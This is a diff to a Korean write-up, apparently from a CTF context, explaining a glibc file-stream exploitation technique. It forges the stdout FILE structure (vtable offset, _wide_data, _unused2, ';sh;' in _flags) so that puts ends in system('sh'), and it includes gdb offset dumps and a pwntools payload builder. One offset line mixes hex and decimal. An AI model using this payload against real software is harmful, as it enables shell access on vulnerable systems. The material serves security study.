@@ -302,7 +302,7 @@ libc_hidden_def (_IO_wdoallocbuf)
 정리하면 다음과 같다.
 `_IO_puts` → (`_IO_sputn` , vtable corrupted) → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE (fp)`
 
-코드 흐름에서 constraints가 몇 가지 존재하며, 코드 아래에 정리해두었다.
+코드 흐름에서 constraints가 몇 가지 존재하여 코드와 같이 정리해두었다.
 
 ### puts
 ---
@@ -324,17 +324,276 @@ _IO_puts (const char *str)
   _IO_release_lock (stdout);
   return result;
 }
+```
+* Constraints
+1. `_IO_acquire_lock`이 있어 `_IO_2_1_stdout`의 멤버변수 lock이 rw 영역을 가리켜야 한다. (이렇게 주면 충분 - libc.symbols['_IO_2_1_stdout_'] + 0x10) 
+2. `vtable->__xsputn == `_IO_wfile_overflow`
+`_IO_2_1_stdout`의 vtable을 덮어 `_IO_sputn`을 호출했을 때 `_IO_wfile_jumps->__overflow`에 해당하는 `_IO_wfile_overflow`이 호출되도록 한다.
 
-weak_alias (_IO_puts, puts)
-libc_hidden_def (_IO_puts)
+### _IO_wfile_overflow
 
-#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
-#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
-#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
+---
 
-#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable((THIS)))
+```c
+wint_t
+_IO_wfile_overflow (FILE *f, wint_t wch)
+{
+  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
+    {
+      f->_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
+    {
+      /* Allocate a buffer if needed. */
+      if (f->_wide_data->_IO_write_base == 0)
+	{
+	  _IO_wdoallocbuf (f);
+		// [...]
+	}
+}
+```
+* Constraints (`f=stdout`)
+1. `f->_flags & _IO_NO_WRITES == 0`
+2. `f->_flags & _IO_CURRENTLY_PUTTING == 0`
+3. `f->_wide_data->_IO_write_base == 0`
+
+
+### _IO_wdoallocbuf
+
+---
+
+```c
+void
+_IO_wdoallocbuf (FILE *fp)
+{
+  if (fp->_wide_data->_IO_buf_base)
+    return;
+  if (!(fp->_flags & _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
+
+#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
+```
+* Constraints
+1. `fp->_wide_data->_IO_buf_base == 0`
+2. `fp->_flags & _IO_UNBUFFERED == 0`
+3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`
+
+
+## Constraints
+---
+나온 제약 조건을 정리하면 다음과 같다.
+- puts
+1. `fp = stdout` 
+2. `fp->lock` → rw
+3. `fp->vtable->__xsputn == _IO_wfile_overflow`
+
+- _IO_wfile_overflow
+1. `fp->_flags & _IO_NO_WRITES == 0`
+2. `fp->_flags & _IO_CURRENTLY_PUTTING == 0`
+3. `fp->_wide_data->_IO_write_base == 0`
+
+- _IO_wdoallocbuf
+1. `fp->_wide_data->_IO_buf_base == 0`
+2. `fp->_flags & _IO_UNBUFFERED == 0`
+3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`
+
+이제 fp의 각 인자에 대해 제약 조건을 정리하자.
+
+### fp→vtable
+
+---
+`vtable->__xsputn == _IO_wfile_jumps.__overflow`
+이 조건이 충족되도록 fp를 구성하기 위해 `_IO_jump_t` 에서 `__xsputn`, `__overflow`의 offset을 확인해야 한다.
+
+```c
+gef➤  ptype /o _IO_wfile_jumps
+/* offset      |    size */  type = const struct _IO_jump_t {
+/*      0      |       8 */    size_t __dummy;
+/*      8      |       8 */    size_t __dummy2;
+/*     16      |       8 */    _IO_finish_t __finish;
+/*     24      |       8 */    _IO_overflow_t __overflow;
+/*     32      |       8 */    _IO_underflow_t __underflow;
+/*     40      |       8 */    _IO_underflow_t __uflow;
+/*     48      |       8 */    _IO_pbackfail_t __pbackfail;
+/*     56      |       8 */    _IO_xsputn_t __xsputn;
+/*     64      |       8 */    _IO_xsgetn_t __xsgetn;
+/*     72      |       8 */    _IO_seekoff_t __seekoff;
+/*     80      |       8 */    _IO_seekpos_t __seekpos;
+/*     88      |       8 */    _IO_setbuf_t __setbuf;
+/*     96      |       8 */    _IO_sync_t __sync;
+/*    104      |       8 */    _IO_doallocate_t __doallocate;
+/*    112      |       8 */    _IO_read_t __read;
+/*    120      |       8 */    _IO_write_t __write;
+/*    128      |       8 */    _IO_seek_t __seek;
+/*    136      |       8 */    _IO_close_t __close;
+/*    144      |       8 */    _IO_stat_t __stat;
+/*    152      |       8 */    _IO_showmanyc_t __showmanyc;
+/*    160      |       8 */    _IO_imbue_t __imbue;
+
+                               /* total size (bytes):  168 */
+                             }
 ```
 
+- `__overflow` : 24 (0x18)
+- `__xsputn` :  56 (0x38)
+
+⇒ `fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
+으로 설정하면 `vtable->__xsputn`이 정확히 `_IO_wfile_jumps - 0x20 + 0x56 == _IO_wfile_jumps.__overflow` ⇒ `_IO_wfile_overflow` 을 가리킴.
+
+### fp→_flags
+
+---
+
+`_flags & _IO_NO_WRITES == 0`
+
+`_flags & _IO_CURRENTLY_PUTTING == 0`
+
+`_flags & _IO_UNBUFFERED == 0`
+
+```c
+// #define _IO_NO_WRITES         0x0008
+// #define _IO_CURRENTLY_PUTTING 0x0800
+// #define _IO_UNBUFFERED        0x0002
+```
+코드 흐름의 가장 마지막에서 `_IO_WDOALLOCATE (fp)`가 호출되는데, `_IO_FILE`의 첫번째 멤버 변수인 `_flags`를 통해 RDI에 sh를 넣을 수 있다. 하위 2바이트를 `\x01\x01` 으로 구성하면 null이 들어가지 않게 검증을 통과할 수 있다.
+
+`fp._flags` → `b"\x01\x01;sh;\x00\x00”` 로 구성하여 최종 단계에서 RDI에 sh가 들어가도록 하자.
+
+### fp→_wide_data
+
+---
+`_wide_data->_IO_buf_base == 0` 
+`_wide_data->_IO_write_base == 0`
+`_wide_data->_wide_vtable_->__doallocate == libc_system` 
+3가지 조건을 만족해야 한다.
+
+```c
+gef➤  ptype /o struct _IO_wide_data
+/* offset      |    size */  type = struct _IO_wide_data {
+/*      0      |       8 */    wchar_t *_IO_read_ptr;
+/*      8      |       8 */    wchar_t *_IO_read_end;
+/*     16      |       8 */    wchar_t *_IO_read_base;
+/*     24      |       8 */    wchar_t *_IO_write_base;
+/*     32      |       8 */    wchar_t *_IO_write_ptr;
+/*     40      |       8 */    wchar_t *_IO_write_end;
+/*     48      |       8 */    wchar_t *_IO_buf_base;
+/*     56      |       8 */    wchar_t *_IO_buf_end;
+/*     64      |       8 */    wchar_t *_IO_save_base;
+/*     72      |       8 */    wchar_t *_IO_backup_base;
+/*     80      |       8 */    wchar_t *_IO_save_end;
+/*     88      |       8 */    __mbstate_t _IO_state;
+/*     96      |       8 */    __mbstate_t _IO_last_state;
+/*    104      |     112 */    struct _IO_codecvt {
+/*    104      |      56 */        _IO_iconv_t __cd_in;
+/*    160      |      56 */        _IO_iconv_t __cd_out;
+
+                                   /* total size (bytes):  112 */
+                               } _codecvt;
+/*    216      |       4 */    wchar_t _shortbuf[1];
+/* XXX  4-byte hole      */
+/*    224      |       8 */    const struct _IO_jump_t *_wide_vtable;
+
+                               /* total size (bytes):  232 */
+                             }
+
+gef➤  ptype /o _IO_wfile_jumps
+/* offset      |    size */  type = const struct _IO_jump_t {
+/*      0      |       8 */    size_t __dummy;
+/*      8      |       8 */    size_t __dummy2;
+
+  ...
+  
+/*    104      |       8 */    _IO_doallocate_t __doallocate;
+
+```
+
+`*(_wide_data+24) == 0`
+`*(_wide_data+48) == 0`
+의 두 가지 조건과 더불어
+
+`*(*(_wide_data+224)+104) == libc_system`을 만족해야 한다.
+
+```c
+type = struct _IO_FILE {
+/*      0      |       4 */    int _flags;
+/* XXX  4-byte hole      */
+/*      8      |       8 */    char *_IO_read_ptr;
+/*     16      |       8 */    char *_IO_read_end;
+/*     24      |       8 */    char *_IO_read_base;
+/*     32      |       8 */    char *_IO_write_base;
+
+  ...
+    
+/*    184      |       8 */    size_t __pad5;
+/*    192      |       4 */    int _mode;
+/*    196      |      20 */    char _unused2[20];
+
+                               /* total size (bytes):  216 */
+                             } *
+```
+
+`fp->_wide_data = &_IO_2_1_stdout_ - 16`와 같이 설정할 경우
+
+`*(_wide_data+24) == fp->_IO_read_ptr == 0`
+`*(_wide_data+48) == fp->_IO_write_base == 0`
+`*(*(_wide_data+224)+104) == *(*(QWORD**)&fp->_unused2[12]+104//8) == &libc_system`으로 조건을 설정할 수 있다.
+
+`*(QWORD*)fp->_unused2[12] = (QWORD)&fp->_unused2-104, *(QWORD*)&fp->_unused2= &libc_system`으로 설정했다.
 
 
+## 결론
+---
+`fp->_flags == b"\x01\x01;sh;\x00\x00"`
+`fp->_lock == libc.symbols['_IO_2_1_stdout_'] + 0x10`
+`fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
 
+`fp->_wide_data = libc.symbols['_IO_2_1_stdout_'] - 16`
+`fp->_IO_read_ptr == 0`
+`fp->_IO_write_base == 0`
+`fp->_unused2 = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)`
+
+이렇게 stdout을 구성하면 system("sh")를 호출할 수 있다. 
+
+
+```python
+libc.address = libc_base
+def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
+_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
+_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
+_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
+_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
+__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
+    
+    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
+    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
+    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
+    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
+    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
+    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
+    FSOP += p64(__pad5) + p32(_mode)
+    if _unused2 == b"":
+        FSOP += b"\x00"*0x14
+    else:
+        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
+    
+    FSOP += p64(vtable)
+    FSOP += more_append
+    return FSOP
+
+_IO_file_jumps = libc.symbols['_IO_file_jumps']
+stdout = libc.symbols['_IO_2_1_stdout_']
+log.info("stdout: " + hex(stdout))
+FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
+        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
+        _IO_read_ptr    = 0x0, \
+        _IO_write_base  = 0x0, \
+        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
+        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
+        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
+        )
+```
+이를 코드로 정리하면 위와 같다.
+FSOP_struct()의 경우 @qwerty님이 화햇 예선 디스코드에 올리신 걸 그대로 썼다 ^.^
